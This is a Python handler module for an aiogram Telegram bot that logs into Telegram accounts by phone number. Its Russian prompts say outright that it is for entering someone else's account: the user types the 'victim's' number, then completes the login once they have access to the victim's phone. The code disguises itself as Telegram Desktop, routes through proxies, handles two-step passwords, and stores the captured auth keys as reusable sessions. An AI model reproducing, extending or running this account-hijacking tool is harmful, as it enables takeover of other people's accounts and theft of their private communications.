import logging

from aiogram import F, Router
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, Message
from opentele.api import API
from pyrogram import enums
from pyrogram.client import Client
from pyrogram.errors import BadRequest, SessionPasswordNeeded

from bot import keyboards as kb
from bot.core.db import Repo
from bot.core.session.proxy import ProxyManager
from bot.core.session.session import SessionManager
from bot.misc.states import LoginStates
from bot.misc.storage import AuthStorage

from .menu import text_session

logger = logging.getLogger(__name__)

router = Router()


@router.message(F.text == "🆕 Войти")
async def upload_session_handler(message: Message):
    await message.answer(
        "Выбери тип авторизации\n(Скоро будет доступен вход по QR)",
        reply_markup=kb.sessions.auth_type(),
    )


@router.callback_query(F.data == "login_phone")
async def upload_pyrogram_handler(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.set_state(LoginStates.phone_number)
    await query.message.edit_text(
        "Если ты хочешь зайти в чужой телеграм, введи номер жертвы\n\n"
        "Затем когда будет доступ к ее телефону или телеграму, посмотри код и заверши вход\n\n"
        "☎️ Введи номер телефона:"
    )


@router.message(LoginStates.phone_number)
async def upload_session_handler(message: Message, state: FSMContext):
    phone_number = "".join(x for x in message.text if x.isdigit())
    await state.update_data(phone_number=phone_number)
    await message.answer(
        f"Телефон <code>{phone_number}</code> коректен?",
        reply_markup=kb.sessions.phone_confirm(),
    )
    await state.set_state(LoginStates.phone_confirm)


@router.callback_query(F.data == "phone_cancel", LoginStates.phone_confirm)
async def upload_pyrogram_handler(query: CallbackQuery, state: FSMContext):
    await state.clear()
    await query.message.edit_text("❌ Отменено")


@router.callback_query(F.data == "phone_confirm", LoginStates.phone_confirm)
async def upload_pyrogram_handler(
    query: CallbackQuery, state: FSMContext, pm: ProxyManager
):
    data = await state.get_data()
    api = API.TelegramDesktop.Generate(system="windows")
    client = Client(
        name="Login",
        api_id=api.api_id,
        api_hash=api.api_hash,
        app_version=api.app_version,
        device_model=api.device_model,
        system_version=api.system_version,
        lang_code=api.lang_code,
        in_memory=True,
        phone_number=data["phone_number"],
        proxy=pm.get.pyro_format(),
    )
    AuthStorage.set(query.from_user.id, client)

    await client.connect()

    try:
        sent_code = await client.send_code(phone_number=client.phone_number)

    except BadRequest as e:
        await query.message.edit_text(f"❌ Ошибка:\n<b>{e.MESSAGE}</b>")
        await state.clear()

    else:
        sent_code_descriptions = {
            enums.SentCodeType.APP: "Telegram app",
            enums.SentCodeType.SMS: "SMS",
            enums.SentCodeType.CALL: "phone call",
            enums.SentCodeType.FLASH_CALL: "phone flash call",
            enums.SentCodeType.FRAGMENT_SMS: "Fragment SMS",
        }

        await state.set_state(LoginStates.phone_code)
        await state.update_data(phone_code_hash=sent_code.phone_code_hash)
        await query.message.edit_text(
            f"Код подтверждения отправлен через {sent_code_descriptions[sent_code.type]}\n"
            "🔑 Введите код:",
            reply_markup=kb.main_menu.close(),
        )


@router.message(F.text, LoginStates.phone_code)
async def upload_pyrogram_handler(message: Message, state: FSMContext, repo: Repo):
    data = await state.get_data()
    client = AuthStorage.get(message.from_user.id)

    try:
        signed_in = await client.sign_in(
            client.phone_number, data["phone_code_hash"], message.text
        )

    except BadRequest as e:
        await message.answer(
            f"❌ Ошибка:\n<b>{e.MESSAGE}</b>\n\nПопробуйте еще раз",
            reply_markup=kb.main_menu.close(),
        )

    except SessionPasswordNeeded as e:
        await state.set_state(LoginStates.password)
        hint = await client.get_password_hint()
        await message.answer(
            f"Подсказка: {hint}\n"
            "🔑 Двухэтапная проверка включена, и требуется ввести пароль:",
            reply_markup=kb.main_menu.close(),
        )

    else:
        await state.clear()
        manager = SessionManager(
            dc_id=await client.storage.dc_id(),
            auth_key=await client.storage.auth_key(),
            user_id=signed_in.id,
        )
        session = await repo.session.add_from_manager(message.from_user.id, manager)
        await client.disconnect()
        AuthStorage._del(message.from_user.id)

        await message.answer(
            text_session(manager), reply_markup=kb.sessions.action(session.id)
        )


@router.message(LoginStates.password)
async def upload_session_handler(message: Message, state: FSMContext, repo: Repo):
    client = AuthStorage.get(message.from_user.id)

    try:
        signed_in = await client.check_password(message.text)

    except BadRequest as e:
        await message.answer(
            f"❌ Ошибка:\n<b>{e.MESSAGE}</b>\n\nПопробуйте еще раз",
            reply_markup=kb.main_menu.close(),
        )

    else:
        await state.clear()
        manager = SessionManager(
            dc_id=await client.storage.dc_id(),
            auth_key=await client.storage.auth_key(),
            user_id=signed_in.id,
        )
        session = await repo.session.add_from_manager(message.from_user.id, manager)
        await client.disconnect()
        AuthStorage._del(message.from_user.id)

        await message.answer(
            text_session(manager), reply_markup=kb.sessions.action(session.id)
        )
